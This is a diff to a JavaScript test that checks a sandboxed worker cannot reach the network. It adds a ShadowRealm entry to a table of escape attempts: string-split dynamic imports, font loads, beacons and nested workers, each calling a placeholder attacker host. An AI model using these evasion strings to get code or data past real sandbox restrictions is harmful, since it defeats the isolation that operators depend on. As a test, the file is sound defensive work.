@@ -99,6 +99,7 @@ test("live-js has no network: every way out fails in the worker, nothing is requ
     asyncCtorImport: `(async () => {}).constructor("return imp" + "ort('https://${EVIL}/async.js')")()`,
     timerImport: `setTimeout("imp" + "ort('https://${EVIL}/timer.js')")`,
     fontFace: `new FontFace("x", "url(https://${EVIL}/font.woff2)").load()`,
+    shadowRealm: `new ShadowRealm().evaluate("imp" + "ort('https://${EVIL}/realm.js')")`,
     beacon: `navigator.sendBeacon("https://${EVIL}/beacon", "x")`,
     nestedWorker: `new Worker("https://${EVIL}/worker.js")`,
     globalFetch: `globalThis.fetch("https://${EVIL}/global")`,
